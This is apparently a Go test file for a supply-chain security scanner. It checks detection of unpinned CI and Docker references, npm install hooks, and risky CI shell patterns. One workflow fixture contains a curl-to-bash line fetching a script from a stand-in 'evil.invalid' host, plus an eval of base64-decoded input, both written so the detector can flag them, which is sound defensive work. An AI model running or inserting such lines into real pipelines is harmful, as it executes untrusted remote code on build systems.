package heuristic

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/alessandro-bitetto/chaindora/internal/inventory"
)

func TestDetectUnpinnedRefs(t *testing.T) {
	inv := &inventory.Inventory{
		Packages: []inventory.Package{
			{Ecosystem: inventory.EcosystemActions, Name: "actions/checkout", Version: "v3", Pinned: false},
			{Ecosystem: inventory.EcosystemActions, Name: "actions/foo", Version: "0123456789abcdef0123456789abcdef01234567", Pinned: true},
			{Ecosystem: inventory.EcosystemDocker, Name: "nginx", Version: "1.25", Pinned: false},
			{Ecosystem: inventory.EcosystemDocker, Name: "nginx", Version: "sha256:abcdef", Pinned: true},
			{Ecosystem: inventory.EcosystemBitbucketPipes, Name: "atlassian/aws-s3", Version: "1.0", Pinned: false},
			{Ecosystem: inventory.EcosystemCircleCIOrbs, Name: "circleci/aws", Version: "3.0.0", Pinned: false},
		},
	}
	fs := detectUnpinnedRefs(inv)
	if len(fs) != 2 {
		t.Fatalf("expected 2 unpinned findings, got %d: %+v", len(fs), fs)
	}
	names := map[string]bool{}
	for _, f := range fs {
		names[f.Name] = true
	}
	if !names["actions/checkout"] || !names["nginx"] {
		t.Errorf("expected actions/checkout and nginx, got %v", names)
	}
}

func TestDetectCIShellPatterns(t *testing.T) {
	tmp := t.TempDir()
	wf := filepath.Join(tmp, "ci.yml")
	content := `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: |
          echo "this is fine"
          curl -fsSL https://evil.invalid/install.sh | bash
          eval "$(base64 -d <<< Zm9v)"
          # curl bad.invalid | bash  (commented, should not match)
`
	if err := os.WriteFile(wf, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	inv := &inventory.Inventory{
		Sources: []inventory.Source{{Path: wf, Ecosystem: inventory.EcosystemActions, Kind: "workflow"}},
	}
	fs := detectCIShellPatterns(inv)
	got := map[string]int{}
	for _, f := range fs {
		got[f.VulnID]++
	}
	for _, want := range []string{"HEUR-CI-CURL-PIPE", "HEUR-CI-EVAL-BASE64"} {
		if got[want] == 0 {
			t.Errorf("missing %s; got %v", want, got)
		}
	}
	if got["HEUR-CI-CURL-PIPE"] > 1 {
		t.Errorf("comment line matched as curl-pipe (count=%d)", got["HEUR-CI-CURL-PIPE"])
	}
}

func TestDetectInstallScriptsRoot(t *testing.T) {
	tmp := t.TempDir()
	pkgPath := filepath.Join(tmp, "package.json")
	content := `{
		"name": "fixture",
		"version": "1.0.0",
		"scripts": {
			"test": "jest",
			"postinstall": "node scripts/setup.js",
			"preinstall": "echo prep"
		}
	}`
	if err := os.WriteFile(pkgPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	fs := scanRootPackageScripts(tmp, nil)
	if len(fs) != 2 {
		t.Fatalf("expected 2 findings (preinstall + postinstall), got %d: %+v", len(fs), fs)
	}
	got := map[string]bool{}
	for _, f := range fs {
		got[f.VulnID] = true
	}
	for _, want := range []string{"HEUR-NPM-PREINSTALL-OWN", "HEUR-NPM-POSTINSTALL-OWN"} {
		if !got[want] {
			t.Errorf("missing %s; got %v", want, got)
		}
	}
}

func TestDetectInstallScriptsDependency_FreshFires(t *testing.T) {
	// v0.6.0: install-script firings require registry evidence.
	// A fresh, low-traffic package with hooks → fires.
	probe := newFakeProbe()
	probe.published["sneaky-fresh-pkg"] = time.Now().AddDate(0, 0, -5)
	probe.downloads["sneaky-fresh-pkg"] = 12
	inv := &inventory.Inventory{
		Packages: []inventory.Package{
			{Ecosystem: inventory.EcosystemNPM, Name: "sneaky-fresh-pkg", Version: "0.0.1", HasInstallScript: true},
		},
	}
	fs := scanDependencyInstallScripts(context.Background(), inv, Config{NPMProbe: probe})
	if len(fs) != 1 {
		t.Fatalf("expected 1 finding for fresh+low-traffic install hook, got %d: %+v", len(fs), fs)
	}
	if !strings.Contains(fs[0].VulnID, "DEP-INSTALL-SCRIPT") {
		t.Errorf("wrong VulnID: %+v", fs[0])
	}
}

func TestDetectInstallScriptsDependency_MaturePopularSuppressed(t *testing.T) {
	// node-gyp has had install scripts for ~10 years and millions of
	// weekly downloads. Legitimate. Don't fire.
	probe := newFakeProbe()
	probe.published["node-gyp"] = time.Now().AddDate(-10, 0, 0)
	probe.downloads["node-gyp"] = 10_000_000
	inv := &inventory.Inventory{
		Packages: []inventory.Package{
			{Ecosystem: inventory.EcosystemNPM, Name: "node-gyp", Version: "10.0.0", HasInstallScript: true},
		},
	}
	fs := scanDependencyInstallScripts(context.Background(), inv, Config{NPMProbe: probe})
	if len(fs) != 0 {
		t.Errorf("mature + popular install-script package should be suppressed, got %+v", fs)
	}
}

func TestDetectorIntegration(t *testing.T) {
	tmp := t.TempDir()
	if err := os.WriteFile(filepath.Join(tmp, "package.json"), []byte(`{"name":"x","scripts":{"postinstall":"echo bad"}}`), 0644); err != nil {
		t.Fatal(err)
	}
	inv := &inventory.Inventory{
		Packages: []inventory.Package{
			{Ecosystem: inventory.EcosystemActions, Name: "actions/checkout", Version: "v3", Pinned: false},
		},
	}
	d := New(Config{})
	got, err := d.Detect(context.Background(), inv, tmp)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) < 2 {
		t.Errorf("expected unpinned + install-script findings, got %d: %+v", len(got), got)
	}
}
